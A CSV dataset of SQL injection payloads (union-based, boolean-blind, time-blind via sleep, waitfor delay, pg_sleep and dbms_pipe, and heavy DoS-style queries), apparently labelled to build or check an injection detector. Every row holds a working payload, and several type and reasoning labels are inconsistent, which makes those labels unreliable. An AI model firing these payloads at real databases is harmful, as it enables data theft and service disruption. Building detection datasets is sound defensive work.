payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"-5411%"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1468,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-5411%"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """
"-6084"" ) ) union all select 7354,7354,7354,7354,7354,7354,7354,7354#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1469,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6084"" ) ) union all select 7354,7354,7354,7354,7354,7354,7354,7354#"
"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ""kojr"" = ""kojr",time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,1470,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ""kojr"" = ""kojr"
-4191 ) order by 1#,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1471,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-4191 ) order by 1#
"1"" ) where 6632 = 6632 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1472,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" ) where 6632 = 6632 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --"
"1"" ) ) waitfor delay '0:0:5' and ( ( ""witb"" = ""witb",time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1473,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"1"" ) ) waitfor delay '0:0:5' and ( ( ""witb"" = ""witb"
-2707' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'mwdq' = 'mwdq,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1474,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-2707' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'mwdq' = 'mwdq
1 ) where 8375 = 8375,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1475,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 8375 = 8375
1' in boolean mode ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) #,boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1476,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' in boolean mode ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) #
select case when 3920 = 4402 then 1 else null end--,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1477,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select case when 3920 = 4402 then 1 else null end--
1' ) ) ) and 5615 = 5458--,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1478,boolean_blind,generic,Pattern match: 'and 5615 = 5458' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) ) and 5615 = 5458--
"-8810' ) or make_set ( 9354 = 9354,7185 ) and ( 'prsn' like 'prsn",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1479,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-8810' ) or make_set ( 9354 = 9354,7185 ) and ( 'prsn' like 'prsn"
"-5706"" ) ) union all select 2013,2013,2013,2013#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1480,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5706"" ) ) union all select 2013,2013,2013,2013#"
1' ) where 9159 = 9159,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1481,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 9159 = 9159
"-7860' ) ) ) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1482,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7860' ) ) ) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--"
"-3546%"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """,boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1483,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"-3546%"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""%"" = """
1' ) where 2928 = 2928,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1484,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 2928 = 2928
"1"" ) ) as ajwe where 1153 = 1153 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",boolean_blind,generic,0.8,RLIKE case when for blind,KEEP,,boolean_blind,generic,1485,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) as ajwe where 1153 = 1153 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --"
-9668' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1486,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-9668' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --
select ( case when ( 2140 = 5325 ) then 2140 else 2140* ( select 2140 from information_schema.character_sets ) end ) #,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1487,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 2140 = 5325 ) then 2140 else 2140* ( select 2140 from information_schema.character_sets ) end ) #
select ( case when ( 1123 = 9550 ) then 1123 else 1123* ( select 1123 from information_schema.character_sets ) end ) #,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1488,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 1123 = 9550 ) then 1123 else 1123* ( select 1123 from information_schema.character_sets ) end ) #
"-9140"" ) ) union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1489,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9140"" ) ) union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#"
"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1490,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--"
-4669 ) or 2452 = 1601#,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1491,boolean_blind,generic,Pattern match: 'or 2452 = 1601' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-4669 ) or 2452 = 1601#
1%' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( '%' = ',boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1492,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1%' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( '%' = '
1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'rozr' like 'rozr,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1493,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'rozr' like 'rozr
"-7122"" ) union all select 4002,4002,4002,4002,4002,4002,4002,4002#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1494,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7122"" ) union all select 4002,4002,4002,4002,4002,4002,4002,4002#"
"-3460%"" ) ) ) or 9323 = 9323#",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1495,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-3460%"" ) ) ) or 9323 = 9323#"
-8057' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1496,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-8057' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --
"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1497,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )"
1'+ ( select eluw where 6210 = 6210,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1498,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select eluw where 6210 = 6210
"1 ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1499,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 )"
"-5217'|| ( select 'juen' from dual where 7336 = 7336 union all select 7336,7336,7336--",union_based,oracle,0.85,UNION ALL for union-based,KEEP,,union_based,oracle,1500,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"-5217'|| ( select 'juen' from dual where 7336 = 7336 union all select 7336,7336,7336--"
1' ) ) as egsj where 3447 = 3447,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1501,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as egsj where 3447 = 3447
"1"" ) as ssbz where 8885 = 8885 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1502,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) as ssbz where 8885 = 8885 union all select null,null,null,null,null,null,null,null,null--"
-6298' or 4724 = 4876,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1503,boolean_blind,generic,Pattern match: 'or 4724 = 4876' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6298' or 4724 = 4876
"select sleep ( 5 ) and ( ( ( ""wucy"" like ""wucy",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1504,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"select sleep ( 5 ) and ( ( ( ""wucy"" like ""wucy"
-1802' or 7931 = 5841--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1505,boolean_blind,generic,Pattern match: 'or 7931 = 5841' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1802' or 7931 = 5841--
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'teng' like 'teng",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1506,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'teng' like 'teng"
"1 union all select null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1507,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 union all select null,null,null,null,null#"
"-1390%"" ) ) union all select 8930,8930,8930,8930,8930#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1508,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1390%"" ) ) union all select 8930,8930,8930,8930,8930#"
"1 where 1992 = 1992 union all select null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1509,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 where 1992 = 1992 union all select null,null--"
"1"" and 5205 = 9975#",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1510,boolean_blind,generic,Pattern match: 'and 5205 = 9975' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" and 5205 = 9975#"
"-8929%' ) union all select 9486,9486,9486,9486#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1511,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8929%' ) union all select 9486,9486,9486,9486#"
"-3462 ) ) as biyl where 5143 = 5143 union all select 5143,5143,5143--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1512,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3462 ) ) as biyl where 5143 = 5143 union all select 5143,5143,5143--"
"-2570"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""dmch"" like ""dmch",boolean_blind,mssql,0.8,CHAR case when for blind,KEEP,,boolean_blind,mssql,1513,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-2570"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""dmch"" like ""dmch"
-6218' ) ) or 2236 = 4469#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1514,boolean_blind,generic,Pattern match: 'or 2236 = 4469' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6218' ) ) or 2236 = 4469#
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ""vzft"" = ""vzft",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1515,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ""vzft"" = ""vzft"
"-2071 union all select 4753,4753--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1516,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2071 union all select 4753,4753--"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) -- sztf",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1517,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) -- sztf"
"-1076 union all select 3959,3959--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1518,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1076 union all select 3959,3959--"
"1' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 'tpeo' like 'tpeo",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1519,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 'tpeo' like 'tpeo"
"1 ) ) union all select null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1520,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) union all select null,null,null,null#"
1'|| ( select 'kuxp' where 7123 = 7123 and 1688 = 4200#,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1521,boolean_blind,generic,Pattern match: 'and 1688 = 4200' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1'|| ( select 'kuxp' where 7123 = 7123 and 1688 = 4200#
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1522,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#"
"-8043%"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1523,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-8043%"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""%"" = """
-6122' ) ) ) or 9243 = 6161--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1524,boolean_blind,generic,Pattern match: 'or 9243 = 6161' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6122' ) ) ) or 9243 = 6161--
"-9725 ) where 9068 = 9068 or elt ( 4723 = 1426,1426 ) --",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1525,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"-9725 ) where 9068 = 9068 or elt ( 4723 = 1426,1426 ) --"
"1%"" ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1526,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1%"" ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
1'+ ( select 'mxlb' where 4900 = 4900,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1527,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'mxlb' where 4900 = 4900
"1 ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 1729 = 1729",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1528,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1 ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 1729 = 1729"
"1%"" ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1529,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%"" ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
"1"" where 2452 = 2452",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1530,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 2452 = 2452"
"select sleep ( 5 ) and ( ""innk"" = ""innk",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1531,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"select sleep ( 5 ) and ( ""innk"" = ""innk"
"-7601"" ) ) ) union all select 1293,1293,1293,1293,1293,1293,1293,1293--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1532,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7601"" ) ) ) union all select 1293,1293,1293,1293,1293,1293,1293,1293--"
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1533,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'"
1'+ ( select 'ymgm' where 8204 = 8204 and sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1534,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1'+ ( select 'ymgm' where 8204 = 8204 and sleep ( 5 ) #
"-4838' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.8,group by elt() for boolean blind,KEEP,,boolean_blind,mysql,1535,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"-4838' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
1' ) ) ) and sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1536,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' ) ) ) and sleep ( 5 ) #
"1%"" ) ) waitfor delay '0:0:5' and ( ( ""%"" = """,time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,1537,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"1%"" ) ) waitfor delay '0:0:5' and ( ( ""%"" = """
"1 ) ) as uizx where 2512 = 2512 and make_set ( 1402 = 2908,2908 ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1538,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) ) as uizx where 2512 = 2512 and make_set ( 1402 = 2908,2908 ) --"
